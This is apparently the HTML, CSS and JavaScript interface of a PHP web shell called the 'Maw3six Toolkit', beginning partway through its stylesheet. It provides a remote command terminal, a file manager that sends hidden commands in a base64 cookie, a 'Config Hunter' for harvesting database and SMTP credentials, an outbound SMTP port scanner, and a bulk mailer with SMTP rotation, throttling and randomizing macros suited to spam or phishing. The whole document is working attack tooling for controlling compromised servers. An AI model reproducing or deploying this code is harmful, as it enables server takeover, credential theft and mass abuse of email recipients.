            background-color: var(--input-bg);
            border: 1px solid var(--border);
            color: var(--foreground);
            padding: 8px;
            border-radius: 4px;
            box-sizing: border-box;
            font-family: inherit;
            resize: vertical;
        }

        #scan-results,
        #mail-status,
        #scan-smtp-results {
            margin-top: 15px;
            white-space: pre-wrap;
        }

        .status-success,
        .status-open {
            color: var(--success);
        }

        .status-error,
        .status-blocked {
            color: var(--error);
        }

        .status-warn {
            color: var(--warn);
        }

        .flex-group {
            display: flex;
            gap: 10px;
            align-items: center;
        }

        .flex-group input[type="number"] {
            width: 60px;
        }

        #files-tab {
            padding: 10px;
            box-sizing: border-box;
        }

        .fm-header {
            display: flex;
            flex-wrap: wrap;
            align-items: center;
            gap: 10px;
            background-color: var(--tab-bg);
            padding: 8px;
            border-radius: 4px;
            margin-bottom: 10px;
        }

        .fm-header .path-input {
            flex-grow: 1;
            background-color: var(--input-bg);
            border: 1px solid var(--border);
            color: var(--foreground);
            padding: 5px;
            border-radius: 3px;
        }

        .fm-server-info {
            font-size: 0.8em;
            color: var(--warn);
            white-space: pre;
        }

        .fm-toolbar button {
            margin-right: 5px;
        }

        .fm-toolbar button:disabled {
            background-color: #333;
            cursor: not-allowed;
        }

        .fm-table-container {
            margin-top: 10px;
            overflow-x: auto;
        }

        .fm-table {
            width: 100%;
            border-collapse: collapse;
        }

        .fm-table th,
        .fm-table td {
            border: 1px solid var(--border);
            padding: 8px;
            text-align: left;
        }

        .fm-table th {
            background-color: var(--tab-active-bg);
        }

        .fm-table tr:nth-child(even) {
            background-color: var(--tab-bg);
        }

        .fm-table .item-name {
            cursor: pointer;
            color: var(--foreground);
        }

        .fm-table .item-name:hover {
            text-decoration: underline;
            color: var(--prompt);
        }

        .fm-actions a {
            margin: 0 4px;
            cursor: pointer;
            text-decoration: none;
            color: var(--warn);
        }

        .fm-actions a:hover {
            color: var(--prompt);
        }

        #fm-editor-modal {
            display: none;
            position: fixed;
            z-index: 100;
            left: 0;
            top: 0;
            width: 100%;
            height: 100%;
            background-color: rgba(0, 0, 0, 0.7);
            justify-content: center;
            align-items: center;
        }

        .fm-editor-content {
            background-color: var(--background);
            border: 1px solid var(--border);
            width: 80%;
            max-width: 900px;
            height: 80%;
            display: flex;
            flex-direction: column;
            border-radius: 5px;
        }

        .fm-editor-header {
            padding: 10px;
            background-color: var(--tab-active-bg);
            font-weight: bold;
        }

        #fm-editor-textarea {
            flex-grow: 1;
            background-color: var(--input-bg);
            color: var(--foreground);
            border: none;
            padding: 10px;
            font-family: inherit;
            resize: none;
        }

        .fm-editor-footer {
            padding: 10px;
            text-align: right;
        }

        #fm-status-bar {
            padding: 5px;
            text-align: center;
            display: none;
        }
    </style>
</head>

<body>
    <div class="tabs">
        <div class="tab-link active" onclick="openTab(event, 'terminal-tab')">Terminal</div>
        <div class="tab-link" onclick="openTab(event, 'files-tab', true)">File Manager</div>
        <div class="tab-link" onclick="openTab(event, 'tools-tab')">Tools</div>
    </div>

    <div id="terminal-tab" class="tab-content active">
        <div id="terminal" onclick="document.getElementById('input').focus();">
            <div id="history"></div>
            <div class="line">
                <span class="prompt" id="prompt"></span>
                <div class="input-area">
                    <input type="text" id="input" autocomplete="off" autocorrect="off" autocapitalize="off"
                        spellcheck="false" autofocus>
                    <span class="cursor">&nbsp;</span>
                </div>
            </div>
        </div>
    </div>

    <div id="files-tab" class="tab-content">
        <div class="fm-header">
            <input type="text" id="fm-path-input" class="path-input">
            <div id="fm-server-info" class="fm-server-info"></div>
        </div>
        <div class="fm-toolbar">
            <button id="fm-back" disabled>&lt;</button>
            <button id="fm-forward" disabled>&gt;</button>
            <button id="fm-new-file">New File</button>
            <button id="fm-new-folder">New Folder</button>
            <button id="fm-upload-file">Upload File(s)</button>
        </div>
        <input type="file" id="fm-file-input" style="display: none;" multiple>
        <div id="fm-status-bar"></div>
        <div class="fm-table-container">
            <table class="fm-table">
                <thead>
                    <tr>
                        <th>Name</th>
                        <th>Size</th>
                        <th>Perms</th>
                        <th>Modified</th>
                        <th>Actions</th>
                    </tr>
                </thead>
                <tbody id="fm-table-body"></tbody>
            </table>
        </div>
        <div id="fm-editor-modal">
            <div class="fm-editor-content">
                <div class="fm-editor-header" id="fm-editor-filename"></div>
                <textarea id="fm-editor-textarea"></textarea>
                <div class="fm-editor-footer">
                    <button id="fm-editor-save">Save</button>
                    <button onclick="document.getElementById('fm-editor-modal').style.display='none'">Close</button>
                </div>
            </div>
        </div>
    </div>

    <div id="tools-tab" class="tab-content">
        <div id="tools">
            <div class="tool-section">
                <h2>Server Scanner</h2>
                <p>Check for common disabled functions and open outgoing SMTP ports.</p><button
                    id="scan-server-btn">Start Scan</button>
                <div id="scan-smtp-results"></div>
            </div>
            <div class="tool-section">
                <h2>Config Hunter</h2>
                <p>Scan for configuration files to find database/SMTP credentials.</p><button id="scan-btn">Start
                    Scan</button>
                <div id="scan-results"></div>
            </div>
            <div class="tool-section">
                <h2>Mailer</h2>
                <form id="mail-form">
                    <p>Leave SMTP list blank to use the local server mailer. Macros like [-randommd5-] are supported.
                    </p>
                    <div class="form-grid">
                        <label for="from_name">From Name:</label><input type="text" id="from_name" name="from_name"
                            value="Maw3six Test" required>
                        <label for="from">From Email:</label>
                        <div><input type="email" id="from" name="from" required>
                            <div style="margin-top:5px;"><input type="checkbox" id="from_as_login"
                                    name="from_as_login"><label for="from_as_login" style="font-weight:normal;"> Use
                                    current SMTP username as From Email</label></div>
                        </div>
                        <label for="to">Recipients:</label><textarea id="to" name="to" rows="4" required
                            placeholder="One email per line..."></textarea>
                        <label for="subject">Subject:</label><input type="text" id="subject" name="subject"
                            value="Test Message" required>
                        <label for="content_type">Content Type:</label><select id="content_type" name="content_type">
                            <option value="plain">Plain Text</option>
                            <option value="html" selected>HTML</option>
                        </select>
                        <label for="body">Body:</label><textarea id="body" name="body"
                            rows="6">This is a <b>test email</b> from the [-sender-] using the <u>Maw3six Toolkit</u>. Your lucky hash is [-randommd5-].</textarea>
                    </div>
                    <hr style="border-color: var(--border); margin: 20px 0;">
                    <div class="form-grid">
                        <label for="smtp_list">SMTP List:</label><textarea id="smtp_list" name="smtp_list" rows="4"
                            placeholder="host:port:user:pass:encryption (ssl/tls/starttls)&#10;One per line..."></textarea>
                        <div class="label">Rotation:</div>
                        <div class="flex-group"><span>Rotate after</span><input type="number" name="rotate_after"
                                min="0" value="0"><span>emails. (0=disabled)</span></div>
                        <div class="label">Throttle:</div>
                        <div class="flex-group"><span>Pause for</span><input type="number" name="pause_for" min="0"
                                value="15"><span>seconds every</span><input type="number" name="pause_every" min="0"
                                value="1"><span>emails. (0=disabled)</span></div>
                    </div>
                    <br><button type="submit">Send Email(s)</button>
                </form>
                <div id="mail-status"></div>
            </div>
            <div class="tool-section">
                <h2>Macro Help</h2>
                <p><strong>[-email-]</strong>: The recipient's full email address.</p>
                <p><strong>[-emailuser-]</strong>: The username part of the recipient's email.</p>
                <p><strong>[-emaildomain-]</strong>: The domain part of the recipient's email.</p>
                <p><strong>[-sender-]</strong>: The sender's email address.</p>
                <p><strong>[-time-]</strong>: The current date and time.</p>
                <p><strong>[-randomletters-]</strong>: A random string of lowercase letters.</p>
                <p><strong>[-randomstring-]</strong>: A random string of letters and numbers.</p>
                <p><strong>[-randomnumber-]</strong>: A random string of numbers.</p>
                <p><strong>[-randommd5-]</strong>: A random MD5 hash.</p>
            </div>
        </div>
    </div>
    <script>
        const selfUrl = '<?php echo basename($_SERVER['PHP_SELF']); ?>';
        let cwd = '<?php echo addslashes(realpath(getcwd())); ?>';
        let fm_zip_enabled = false;

        function openTab(evt, tabName, isFmTab = false) {
            document.querySelectorAll('.tab-content').forEach(tc => tc.style.display = "none");
            document.querySelectorAll('.tab-link').forEach(tl => tl.classList.remove("active"));
            document.getElementById(tabName).style.display = "block";
            evt.currentTarget.classList.add("active");
            if (isFmTab && fmHistory.length === 0) {
                renderFileManager(cwd, true);
            }
        }

        function escapeHtml(text) {
            const div = document.createElement('div');
            div.innerText = text;
            return div.innerHTML;
        }

        function showStatus(bar, message, isError = false) {
            bar.textContent = message;
            bar.className = isError ? 'status-error' : 'status-success';
            bar.style.display = 'block';
            setTimeout(() => {
                bar.style.display = 'none';
            }, 4000);
        }

        const terminalEl = document.getElementById('terminal');
        const historyEl = document.getElementById('history');
        const inputEl = document.getElementById('input');
        const promptEl = document.getElementById('prompt');
        let commandHistory = [];
        let historyIndex = -1;

        function updatePrompt() {
            const user = '<?php echo function_exists('posix_getpwuid') ? posix_getpwuid(posix_geteuid())['name'] : 'user'; ?>';
            const hostname = '<?php echo gethostname(); ?>';
            promptEl.textContent = `${user}@${hostname}:${cwd}$`;
        }
        async function executeCommand(cmd) {
            const formData = new FormData();
            formData.append('action', 'shell');
            formData.append('cmd', cmd);
            formData.append('cwd', cwd);
            try {
                const response = await fetch(selfUrl, {
                    method: 'POST',
                    body: formData
                });
                const output = await response.text();
                if (output.startsWith('SUCCESS:cd:')) {
                    cwd = output.substring(11);
                } else if (output.startsWith('ERROR:cd:')) {
                    appendTerminalOutput(output.substring(9));
                } else {
                    appendTerminalOutput(output);
                }
            } catch (error) {
                appendTerminalOutput(`Network Error: ${error.message}`);
            }
            updatePrompt();
            inputEl.value = '';
            inputEl.disabled = false;
            inputEl.focus();
            terminalEl.scrollTop = terminalEl.scrollHeight;
        }

        function appendTerminalOutput(text) {
            const outputDiv = document.createElement('div');
            outputDiv.className = 'output';
            outputDiv.textContent = text;
            historyEl.appendChild(outputDiv);
        }

        function appendCommandToHistory(cmd) {
            const historyLine = document.createElement('div');
            historyLine.className = 'line';
            historyLine.innerHTML = `<span class="prompt">${promptEl.textContent}</span><div class="input-area"><span>${escapeHtml(cmd)}</span></div>`;
            historyEl.appendChild(historyLine);
        }
        inputEl.addEventListener('keydown', (e) => {
            if (e.key === 'Enter') {
                e.preventDefault();
                const cmd = inputEl.value.trim();
                if (cmd) {
                    appendCommandToHistory(cmd);
                    inputEl.disabled = true;
                    commandHistory.push(cmd);
                    historyIndex = commandHistory.length;
                    executeCommand(cmd);
                }
            } else if (e.key === 'ArrowUp') {
                e.preventDefault();
                if (historyIndex > 0) {
                    historyIndex--;
                    inputEl.value = commandHistory[historyIndex];
                }
            } else if (e.key === 'ArrowDown') {
                e.preventDefault();
                if (historyIndex < commandHistory.length - 1) {
                    historyIndex++;
                    inputEl.value = commandHistory[historyIndex];
                } else {
                    historyIndex = commandHistory.length;
                    inputEl.value = '';
                }
            }
        });

        const scanBtn = document.getElementById('scan-btn');
        const scanResultsEl = document.getElementById('scan-results');
        const scanServerBtn = document.getElementById('scan-server-btn');
        const scanSmtpResultsEl = document.getElementById('scan-smtp-results');
        const mailForm = document.getElementById('mail-form');
        const mailStatusEl = document.getElementById('mail-status');
        scanServerBtn.addEventListener('click', async () => {
            scanServerBtn.disabled = true;
            scanServerBtn.textContent = 'Scanning...';
            scanSmtpResultsEl.innerHTML = 'Checking server capabilities...';
            const formData = new FormData();
            formData.append('action', 'scan_smtp');
            try {
                const response = await fetch(selfUrl, {
                    method: 'POST',
                    body: formData
                });
                const results = await response.json();
                let html = '<strong>PHP Functions:</strong>\n';
                html += `fsockopen(): <span class="${results.fsockopen ? 'status-success' : 'status-error'}">${results.fsockopen ? 'Enabled' : 'DISABLED'}</span>\n\n`;
                html += '<strong>Outgoing SMTP Ports:</strong>\n';
                results.ports.forEach(res => {
                    html += `Port ${res.port}: <span class="${res.status === 'Open' ? 'status-open' : 'status-blocked'}">${res.status}</span>\n`;
                });
                scanSmtpResultsEl.textContent = html;
            } catch (error) {
                scanSmtpResultsEl.textContent = `Error during scan: ${error.message}`;
            }
            scanServerBtn.disabled = false;
            scanServerBtn.textContent = 'Start Scan';
        });
        scanBtn.addEventListener('click', async () => {
            scanBtn.disabled = true;
            scanBtn.textContent = 'Scanning...';
            scanResultsEl.innerHTML = '';
            const formData = new FormData();
            formData.append('action', 'scan_configs');
            formData.append('cwd', cwd);
            try {
                const response = await fetch(selfUrl, {
                    method: 'POST',
                    body: formData
                });
                const results = await response.json();
                if (results.length === 0) {
                    scanResultsEl.textContent = 'No configuration files with known credentials found.';
                } else {
                    let html = '';
                    results.forEach(res => {
                        html += `<strong>Found: ${res.path}</strong>\n`;
                        for (const [key, value] of Object.entries(res.creds)) {
                            html += `  ${key}: ${value}\n`;
                        }
                        html += '\n';
                    });
                    scanResultsEl.textContent = html;
                }
            } catch (error) {
                scanResultsEl.textContent = `Error during scan: ${error.message}`;
            }
            scanBtn.disabled = false;
            scanBtn.textContent = 'Start Scan';
        });

        // JAVASCRIPT LISTENER FOR STREAMING
        mailForm.addEventListener('submit', async (e) => {
            e.preventDefault();
            const mailButton = mailForm.querySelector('button[type="submit"]');
            mailStatusEl.className = '';
            mailStatusEl.textContent = 'Initializing...';
            mailButton.disabled = true;

            const formData = new FormData(mailForm);
            formData.append('action', 'send_mail');

            try {
                const response = await fetch(selfUrl, {
                    method: 'POST',
                    body: formData
                });

                if (!response.ok) {
                    throw new Error(`Server responded with status: ${response.status}`);
                }

                const reader = response.body.getReader();
                const decoder = new TextDecoder();
                mailStatusEl.textContent = ''; // Clear "Initializing..."

                // Read the stream
                while (true) {
                    const {
                        value,
                        done
                    } = await reader.read();
                    if (done) {
                        break; // Stream finished
                    }
                    const chunk = decoder.decode(value, {
                        stream: true
                    });

                    mailStatusEl.textContent += chunk;
                    mailStatusEl.scrollTop = mailStatusEl.scrollHeight;
                }

            } catch (error) {
                mailStatusEl.className = 'status-error';
                mailStatusEl.textContent = `An error occurred: ${error.message}`;
            } finally {
                mailButton.disabled = false;
            }
        });

        // --- File Manager ---
        const fmPathInput = document.getElementById('fm-path-input');
        const fmServerInfoEl = document.getElementById('fm-server-info');
        const fmTableBody = document.getElementById('fm-table-body');
        const fmStatusBar = document.getElementById('fm-status-bar');
        const fmBackBtn = document.getElementById('fm-back');
        const fmForwardBtn = document.getElementById('fm-forward');
        const fmUploadBtn = document.getElementById('fm-upload-file');
        const fmFileInput = document.getElementById('fm-file-input');
        let fmHistory = [];
        let fmHistoryIndex = -1;

        function updateFmNavButtons() {
            fmBackBtn.disabled = fmHistoryIndex <= 0;
            fmForwardBtn.disabled = fmHistoryIndex >= fmHistory.length - 1;
        }

        async function executeFmCookieCommand(command) {
            document.cookie = `cmd=${btoa(JSON.stringify(command))};path=/`;
            try {
                const response = await fetch(selfUrl, {
                    method: 'GET'
                });
                const result = await response.json();
                showStatus(fmStatusBar, result.output, !result.success);
                if (result.success) renderFileManager(cwd);
            } catch (e) {
                showStatus(fmStatusBar, 'Error processing command: ' + e.message, true);
            }
        }

        async function renderFileManager(path, isNewNav = false) {
            if (isNewNav) {
                if (fmHistoryIndex < fmHistory.length - 1) {
                    fmHistory.splice(fmHistoryIndex + 1);
                }
                fmHistory.push(path);
                fmHistoryIndex++;
            }
            updateFmNavButtons();
            const formData = new FormData();
            formData.append('action', 'file_manager');
            formData.append('do', 'list');
            formData.append('path', path);
            try {
                const response = await fetch(selfUrl, {
                    method: 'POST',
                    body: formData
                });
                const data = await response.json();
                if (data.error) {
                    showStatus(fmStatusBar, data.error, true);
                    return;
                }
                cwd = data.info.cwd;
                updatePrompt();
                fmPathInput.value = cwd;
                fm_zip_enabled = data.info.zip_enabled;
                fmServerInfoEl.textContent = `IP: ${data.info.server_ip} | PHP: ${data.info.php_version} | Zip: ${fm_zip_enabled ? 'Yes' : 'No'} | System: ${data.info.uname}`;
                fmTableBody.innerHTML = '';
                data.items.forEach(item => {
                    const isDir = item.perms.startsWith('d');
                    const row = document.createElement('tr');
                    let actions = `<a href="#" data-action="rename" title="Rename">RN</a> <a href="#" data-action="chmod" title="Chmod">CH</a> <a href="#" data-action="delete" title="Delete">DEL</a>`;
                    if (!isDir) {
                        actions += ` <a href="#" data-action="edit" title="Edit">ED</a> <a href="${selfUrl}?action=file_manager&do=download&file=${encodeURIComponent(item.path)}" data-action="download" title="Download">DL</a>`;
                    }
                    if (fm_zip_enabled) {
                        actions += ` <a href="#" data-action="zip" title="Zip">ZIP</a>`;
                    }
                    row.innerHTML = `<td><a href="#" class="item-name" data-isdir="${isDir}">${escapeHtml(item.name)}</a></td><td>${item.size}</td><td>${item.perms}</td><td>${item.mtime}</td><td class="fm-actions" data-path="${escapeHtml(item.path)}" data-name="${escapeHtml(item.name)}">${actions}</td>`;
                    fmTableBody.appendChild(row);
                });
            } catch (e) {
                showStatus(fmStatusBar, "Failed to load file list: " + e.message, true);
            }
        }

        async function handleFileUpload(files) {
            if (files.length === 0) return;
            showStatus(fmStatusBar, `Uploading ${files.length} file(s)...`);
            const formData = new FormData();
            formData.append('action', 'file_manager');
            formData.append('do', 'upload');
            formData.append('path', cwd);
            for (const file of files) {
                formData.append('uploaded_files[]', file);
            }
            try {
                const response = await fetch(selfUrl, {
                    method: 'POST',
                    body: formData
                });
                const result = await response.json();
                showStatus(fmStatusBar, result.output, !result.success);
                if (result.success) {
                    renderFileManager(cwd);
                }
            } catch (error) {
                showStatus(fmStatusBar, 'Upload failed: ' + error.message, true);
            } finally {
                fmFileInput.value = '';
            }
        }

        fmPathInput.addEventListener('keydown', e => {
            if (e.key === 'Enter') renderFileManager(fmPathInput.value, true);
        });
        fmBackBtn.addEventListener('click', () => {
            if (fmHistoryIndex > 0) {
                fmHistoryIndex--;
                renderFileManager(fmHistory[fmHistoryIndex]);
            }
        });
        fmForwardBtn.addEventListener('click', () => {
            if (fmHistoryIndex < fmHistory.length - 1) {
                fmHistoryIndex++;
                renderFileManager(fmHistory[fmHistoryIndex]);
            }
        });
        fmUploadBtn.addEventListener('click', () => fmFileInput.click());
        fmFileInput.addEventListener('change', () => handleFileUpload(fmFileInput.files));

        fmTableBody.addEventListener('click', async e => {
            e.preventDefault();
            const target = e.target;
            const parentActions = target.closest('.fm-actions');
            if (target.classList.contains('item-name')) {
                const isDir = target.getAttribute('data-isdir') === 'true';
                const path = target.closest('tr').querySelector('.fm-actions').dataset.path;
                if (isDir) renderFileManager(path, true);
                else {
                    const actionCell = target.closest('tr').querySelector('.fm-actions a[data-action="edit"]');
                    if (actionCell) actionCell.click();
                }
                return;
            }
            if (parentActions) {
                const action = target.dataset.action;
                const path = parentActions.dataset.path;
                const name = parentActions.dataset.name;
                switch (action) {
                    case 'delete':
                        if (confirm(`Are you sure you want to delete "${name}"?`)) {
                            executeFmCookieCommand({
                                call: 'delete',
                                target: path
                            });
                        }
                        break;
                    case 'rename':
                        const newName = prompt('Enter new name:', name);
                        if (newName && newName !== name) {
                            const newPath = path.substring(0, path.lastIndexOf('/') + 1) + newName;
                            executeFmCookieCommand({
                                call: 'rename',
                                target: path,
                                destination: newPath
                            });
                        }
                        break;
                    case 'chmod':
                        const perms = prompt('Enter new permissions (e.g., 0755):', '0644');
                        if (perms) {
                            executeFmCookieCommand({
                                call: 'chmod',
                                target: path,
                                perms: perms
                            });
                        }
                        break;
                    case 'zip':
                        const zipName = prompt('Enter zip file name:', name + '.zip');
                        if (zipName) {
                            const newPath = path.substring(0, path.lastIndexOf('/') + 1) + zipName;
                            executeFmCookieCommand({
                                call: 'zip',
                                target: path,
                                destination: newPath
                            });
                        }
                        break;
                    case 'edit':
                        const formData = new FormData();
                        formData.append('action', 'file_manager');
                        formData.append('do', 'get_content');
                        formData.append('target', path);
                        const response = await fetch(selfUrl, {
                            method: 'POST',
                            body: formData
                        });
                        const data = await response.json();
                        if (data.success) {
                            document.getElementById('fm-editor-filename').textContent = path;
                            document.getElementById('fm-editor-textarea').value = data.content;
                            document.getElementById('fm-editor-modal').style.display = 'flex';
                        } else {
                            showStatus(fmStatusBar, data.error, true);
                        }
                        break;
                }
            }
        });

        document.getElementById('fm-new-file').addEventListener('click', () => {
            const name = prompt('Enter new file name:');
            if (name) {
                const path = cwd + '/' + name;
                executeFmCookieCommand({
                    call: 'create_file',
                    target: path,
                    content: ''
                });
            }
        });
        document.getElementById('fm-new-folder').addEventListener('click', () => {
            const name = prompt('Enter new folder name:');
            if (name) {
                const path = cwd + '/' + name;
                executeFmCookieCommand({
                    call: 'create_folder',
                    target: path
                });
            }
        });
        document.getElementById('fm-editor-save').addEventListener('click', () => {
            const path = document.getElementById('fm-editor-filename').textContent;
            const content = document.getElementById('fm-editor-textarea').value;
            executeFmCookieCommand({
                call: 'create_file',
                target: path,
                content: content
            }).then(() => {
                document.getElementById('fm-editor-modal').style.display = 'none';
            });
        });

        updatePrompt();
    </script>
</body>

</html>
